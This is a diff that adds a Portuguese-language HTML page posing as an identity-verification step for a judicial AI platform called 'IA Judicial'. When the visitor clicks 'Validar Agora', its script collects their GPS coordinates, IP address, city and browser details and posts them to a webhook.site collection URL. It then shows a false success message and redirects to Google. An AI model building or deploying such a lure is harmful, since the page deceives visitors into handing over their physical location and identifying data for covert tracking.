@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>IA Judicial - Validação</title>
+</head>
+<body style="font-family:sans-serif; text-align:center; padding-top:60px;">
+  <h2>🔒 IA Judicial - Verificação de Identidade</h2>
+  <p>Esta etapa garante que apenas usuários autorizados tenham acesso à plataforma.</p>
+  <p>📍 Ao clicar abaixo, a coleta de dados de acesso.</p>
+  <button onclick="coletarDados()" style="padding:10px 20px; font-size:16px;">Validar Agora</button>
+
+  <script>
+    async function coletarDados() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const lat = pos.coords.latitude;
+          const long = pos.coords.longitude;
+          const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+          
+          const dados = {
+            latitude: lat,
+            longitude: long,
+            ip: ipData.ip,
+            cidade: ipData.city,
+            user_agent: navigator.userAgent,
+            horario: new Date().toISOString()
+          };
+
+          await fetch("https://webhook.site/https://webhook.site/afac7b89-6504-4ac3-9082-78546bafc829", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(dados)
+          });
+
+          alert("Validação concluída com sucesso.");
+          window.location.href = "https://www.google.com";
+        });
+      } else {
+        alert("Seu navegador não suporta geolocalização.");
+      }
+    }
+  </script>
+</body>
+</html>
